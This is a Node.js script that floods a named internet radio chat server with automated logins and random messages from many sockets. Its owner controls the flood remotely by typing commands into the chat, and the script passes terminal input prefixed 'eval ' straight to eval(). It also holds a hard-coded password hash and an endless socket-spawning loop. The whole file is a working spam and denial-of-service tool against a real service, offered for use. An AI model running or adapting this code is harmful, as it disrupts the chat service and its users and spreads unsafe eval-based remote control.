var io = require('socket.io-client');
var chalk = require('chalk');
require(__dirname+'/md5.js');
var spam = {};var ownlogout = false;var owner = "Foam";var debug = true;
var server = 'http://chat.iloveradio.de:13000';var chatroom = '101';var count = 0;
console.log('Server: '+server+'/'+chatroom);
var socket = {};
process.on('uncaughtException', function (err) {
  debugLog('Caught exception: ' + err);
});
function debugLog(text) {
	if(debug){console.log(text);}
}
function query(text, callback) {
    'use strict';
    process.stdin.resume();
    process.stdout.write(text);
    process.stdin.once("data", function (data) {
        callback(data.toString().trim());
    });
}
function getRandom(min, max) {
  return Math.random() * (max - min) + min;
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1) + min);
}

var randomString = function(len){
	var text = "";var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	for(var i=0;i<len;i++){text += possible.charAt(Math.floor(Math.random() * possible.length));}
	return text;
};
var waitForMessage = function(){
	query('', function(response){
		if(response.startsWith('msg ')){
			message(response.replace('msg ', ''));
		}else if(response.startsWith('name ')){
			logout();
			login(response.replace('name ', ''));
		}else if(response.startsWith('eval ')){
			eval(response.replace('eval ', ''));
		}
		process.stdin.pause();
		waitForMessage();
	});
}

var startSpam = function(){
	spam["default"] = setInterval(function(){
			// socket.connect();
			// room('100');
			login(randomString(getRandomInt(5,12)));
			message(randomString(getRandomInt(30,50)));
			logout();
			// socket.disconnect();
		}, getRandomInt(500,1000)
	);
};
var startStartSpam = function(amount, min, max){
	for (var i = 0; i < amount; i++) {
		connectNew(i);
		startSpamNew(i, min, max);
	};
};
var startLoginSpam = function(){
	while(true){
		startLoginSpam(count++);
	}
};
var startSpamNew = function(socket, min, max){
	eval("socket"+socket+".emit('login', {'name': randomString(getRandomInt(4,12))});");
	spam[socket] = setInterval(function(){
			eval("socket"+socket+".emit('chat message', { 'text': randomString(getRandomInt(1,50)) });");'DER CHAT WURDE GESPERRT, BITTE KOMM SPÄTER WIEDER!'
			// eval("socket"+socket+".emit('logout'); ");
		}, getRandomInt(min * 1000,max * 1000)
	);
};
var startLoginSpam = function(socket){
	eval("socket"+socket+" = io(server, {transports: ['websocket', 'xhr-polling', 'polling', 'htmlfile', 'flashsocket']});");
	eval("socket"+socket+".on('login', function(msg) {"+
			"if(msg.success === 'true'){"+
			"debugLog('"+socket+" Logged in.');"+
			"}else if(msg.success === 'wrong'){ socket"+socket+".emit('login', {'name': randomString(getRandomInt(4,12))});"+
			"}else{socket"+socket+".emit('login', {'name': randomString(getRandomInt(4,12))});}"+
		"});"
	);
	eval("socket"+socket+".on('logout', function() {"+
			"debugLog('"+socket+" Logged out.');"+
			"socket"+socket+".emit('login', {'name': randomString(getRandomInt(4,12))});"+
		"});"
	);
	eval("socket"+socket+".connect();");
	eval("socket"+socket+".emit('joinroom', {'room': '101' });");
	debugLog(socket+'Connected.');
	eval("socket"+socket+".emit('login', {'name': randomString(getRandomInt(4,12))});");
	debugLog('"+socket+" Logged in!');
}
var stopSpam = function(){
	clearInterval(spam);
}
var stopSpamNew = function(){
	for(key in spam){
		clearInterval(spam[key]);
	};
	for(key in socket){
		if(key != "default"){
			socket[key].disconnect();
			delete socket[key];
			debugLog('Removed Socket '+key);
		}
	};
}
var register = function(name, email, pw){
	socket.emit('vum_register', {'name': name, 'mail': email, 'password': pw});
}
var login = function(name, email, password){
	if(password){
		socket.emit('login', {
			'name': name,
			'password': "1f781aa52b6ba14df3204709a6f126cc",
			'gast': '1'
		});
	}else{
		socket.emit('login', {
			'name': name
		});
	}
}
var logout = function() {
	ownlogout = true;
    socket.emit('logout'); 
}
var room = function(room){
	socket.emit('joinroom', {
		'room': room
	});
}
var message = function(msg){
	socket.emit('chat message', {
		'text': msg
	});
}
var connect = function(){
	socket["default"] = io(server, {
		transports: ['websocket', 'xhr-polling', 'polling', 'htmlfile', 'flashsocket']
	});
	debugLog('Default: created');
	socket["default"].connect();
	debugLog('Default: connected');
	socket["default"].emit('joinroom', {'room': chatroom });
	debugLog('Default: joined room '+chatroom);
	setTimeout(function(){
		socket["default"].on('chat message', function(msg) {
			var _name = msg.name; var _text = msg.text;
			debugLog(_name+': '+_text)
			if(_name == owner){
				if(msg.text.startsWith('start ')){
					debugLog('test');
					var _txt = _text.replace('start ', '')
					var args = _txt.split(' ') || '';
					startStartSpam(args[0], args[1], args[2]);
				}else if(msg.text == 'starts'){
					startLoginSpam();
				}else if(msg.text == 'stop'){
					stopSpamNew();
				}else if(msg.text == 'neu'){
					process.exit(1);
				}else if(msg.text == 'aus'){
					owner = "";
				}else if(msg.text == 'debug'){
					debug = true;
				}
			}
		});
	}, 1000);
}
var connectNew = function(socket){
	eval("socket"+socket+" = io(server, {transports: ['websocket', 'xhr-polling', 'polling', 'htmlfile', 'flashsocket']});");
	eval("socket"+socket+".on('login', function(msg) {"+
			"if(msg.success === 'true'){"+
			"debugLog('"+socket+" Logged in.');"+
			"}else if(msg.success === 'wrong'){ socket"+socket+".emit('login', {'name': randomString(getRandomInt(4,12))});"+
			"}else{socket"+socket+".emit('login', {'name': randomString(getRandomInt(4,12))});}"+
		"});"
	);
	eval("socket"+socket+".on('logout', function() {"+
			"debugLog('"+socket+" Logged out.');"+
			"socket"+socket+".emit('login', {'name': randomString(getRandomInt(4,12))});"+
		"});"
	);
	eval("socket"+socket+".connect();");
	eval("socket"+socket+".emit('joinroom', {'room': '101' });");
	debugLog(socket+'Connected.');
	// login(randomString(9));
}
connect();
waitForMessage();